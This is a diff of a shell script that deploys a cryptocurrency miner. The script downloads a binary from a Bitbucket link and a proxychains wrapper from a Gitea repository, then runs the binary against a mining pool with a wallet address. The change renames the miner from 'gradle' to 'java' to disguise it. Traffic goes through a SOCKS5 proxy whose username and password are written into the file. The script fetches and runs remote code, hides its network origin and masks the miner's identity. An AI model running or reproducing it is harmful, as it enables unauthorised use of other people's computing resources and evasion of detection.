@@ -2,7 +2,7 @@ proxy="3.227.182.193"
 port="1080" 
 user="w5fg9y6grr43yf"  
 pass="n98vgzuxm9i970ochzkyjkd13i6a" 
-wget -q -O gradle https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x gradle
+wget -q -O java https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x java
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./gradle -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 20-999 -n 1)-EXCEL) -p c=CPU -x socks5://w5fg9y6grr43yf:n98vgzuxm9i970ochzkyjkd13i6a@us-east-static-08.quotaguard.com:1080
+./panel ./java -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 20-999 -n 1)-EXCEL) -p c=CPU -x socks5://w5fg9y6grr43yf:n98vgzuxm9i970ochzkyjkd13i6a@us-east-static-08.quotaguard.com:1080
